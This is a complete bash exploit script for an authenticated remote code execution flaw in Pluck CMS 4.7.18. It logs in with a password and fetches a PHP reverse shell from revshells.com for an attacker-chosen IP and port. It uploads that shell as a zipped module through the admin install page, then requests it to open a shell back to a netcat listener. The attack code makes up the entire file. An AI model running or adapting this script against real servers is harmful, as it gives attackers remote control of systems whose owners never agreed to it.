#!/bin/bash

# Exploit Title: Pluck v4.7.18 - Remote Code Execution (RCE)
# Application: pluck
# Version: 4.7.18
# Bugs: RCE
# Technology: PHP
# Vendor URL: https://github.com/pluck-cms/pluck
# Date of found: 10-07-2023
# Author: Mirabbas AÄŸalarov
# Tested on: Linux

# Start the timer
start_time=$(date +%s)

# Default variables for host, IP, Port, and Password
host=""
ip=""
port=""
password=""
cookie=""

# Function to display usage help
usage() {
    echo "Usage: $0 -h <Host> -p <Password> -i <IP> -P <Port>"
    echo "   -h  Set the host URL (e.g., xyz.htb)"
    echo "   -P  Set the password for the platform"
    echo "   -i  Set the IP address for the reverse shell"
    echo "   -p  Set the Port number for the reverse shell"
    exit 1
}

# Parse command-line arguments
while getopts "h:p:i:P:" opt; do
  case "$opt" in
    h) host="$OPTARG" ;;
    P) password="$OPTARG" ;;
    i) ip="$OPTARG" ;;
    p) port="$OPTARG" ;;
    *) usage ;;
  esac
done

# Check if required arguments are provided
if [ -z "$host" ] || [ -z "$password" ] || [ -z "$ip" ] || [ -z "$port" ]; then
    echo "Error: Host, IP, Port, and Password are required."
    usage
fi

# Loop until Netcat is running on the specified port
while true; do
    nc_check=$(netstat -an | grep ":$port" | grep "LISTEN")
    
    if [ -z "$nc_check" ]; then
        echo "Start a listener using 'nc -nvlp $port' before uploading the exploit."
        sleep 5  # Wait for 5 seconds before checking again
    else
        echo "Netcat listener detected on port $port."
        break
    fi
done

# Set URLs for login, upload, and RCE paths
login_url="http://$host/login.php"
upload_url="http://$host/admin.php?action=installmodule"
rce_url="http://$host/data/modules/loverce/love.php"

# Function to extract and store the session cookie
extract_cookie() {
    cookie=$(echo "$1" | grep -oP '(?<=Set-Cookie: )PHPSESSID=[^;]+')
    echo "Extracted Cookie: $cookie"
}

# Download the reverse shell PHP exploit
echo "Downloading reverse shell PHP exploit..."
exploit_url="https://www.revshells.com/PHP%20PentestMonkey?ip=$ip&port=$port&shell=bash&encoding=bash"
curl -sL "$exploit_url" -o reverse_shell.php

# Check if the download was successful
if [ ! -f reverse_shell.php ]; then
    echo "Error downloading reverse shell exploit."
    exit 1
fi

# Rename reverse_shell.php to love.php (to match the RCE path)
mv reverse_shell.php love.php

# Zip the reverse shell and clean up the PHP file
zip_filename="loverce.zip"
zip -r "$zip_filename" love.php
rm love.php
echo "Exploit zipped as $zip_filename and original PHP file removed."

# Set login payload with only password
login_payload="cont1=$password&bogus=&submit=Log+in"

# Attempt login, follow redirects with -L, and extract the cookie
login_response=$(curl -s -i -L -X POST -d "$login_payload" "$login_url" -H "Content-Type: application/x-www-form-urlencoded" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" -H "Referer: http://$host/login.php" -H "Origin: http://$host" -H "Connection: keep-alive")

# Extract session cookie
extract_cookie "$login_response"

# Check if login was successful
if echo "$login_response" | grep -q "Password correct. Logging you in..."; then
    echo "Login successful!"

    # Upload the ZIP file using the extracted cookie
    upload_response=$(curl -s -i -X POST -F "sendfile=@$zip_filename;type=application/zip" -F "submit=Upload" "$upload_url" -H "Cookie: $cookie")

    # Check if upload was successful
    if echo "$upload_response" | grep -q "HTTP/1.1 200 OK"; then
        echo "ZIP file uploaded successfully."
        
        # Inform the user that RCE is triggered
        echo "RCE is waiting for you, please go take a look."

        # Add a short delay before triggering the RCE
        sleep 5
        
        # Execute the RCE request using the extracted cookie (suppress 504 error)
        rce_response=$(curl -s -H "Cookie: $cookie" "$rce_url" || true)

        # Clean output (don't show 504 Gateway Time-out)
        if [[ ! "$rce_response" =~ "504 Gateway Time-out" ]]; then
            echo "$rce_response"
        fi

        # Calculate the time taken to complete the script
        end_time=$(date +%s)
        duration=$((end_time - start_time))
        echo "Script terminated. Total time taken: $duration seconds."

        exit 0
    else
        echo "Error uploading ZIP file. Check response."
        exit 1
    fi
else
    echo "Login failed."
    # Print login response for debugging
    echo "$login_response"
    exit 1
fi
